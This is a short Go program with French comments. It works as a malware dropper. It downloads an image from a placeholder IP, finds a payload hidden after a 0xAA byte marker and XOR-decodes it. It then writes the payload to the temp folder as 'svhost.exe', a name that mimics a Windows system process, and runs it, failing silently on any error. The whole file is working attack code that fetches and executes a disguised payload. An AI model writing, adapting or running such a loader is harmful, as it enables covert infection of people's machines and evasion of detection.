package main

import (
	"io"
	"net/http"
	"os"
	"os/exec"
)

func main() {
	// Télécharger l'image
	resp, err := http.Get("http://{IP}:8080/img.jpg")
	if err != nil {
		return
	}
	defer resp.Body.Close()
	
	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return
	}
	
	// Chercher le marqueur 0xAA 0xAA 0xAA
	offset := 0
	for i := 0; i < len(data)-3; i++ {
		if data[i] == 0xAA && data[i+1] == 0xAA && data[i+2] == 0xAA {
			offset = i + 3
			break
		}
	}
	
	if offset == 0 || offset >= len(data) {
		return
	}
	
	// Extraire et déchiffrer
	encrypted := data[offset:]
	for i := 0; i < len(encrypted); i++ {
		encrypted[i] ^= 0xAA
	}
	
	// Sauvegarder dans un fichier temporaire
	tmpFile := os.TempDir() + "\\svhost.exe"
	os.WriteFile(tmpFile, encrypted, 0755)
	
	// Exécuter le fichier
	cmd := exec.Command(tmpFile)
	cmd.Start()
}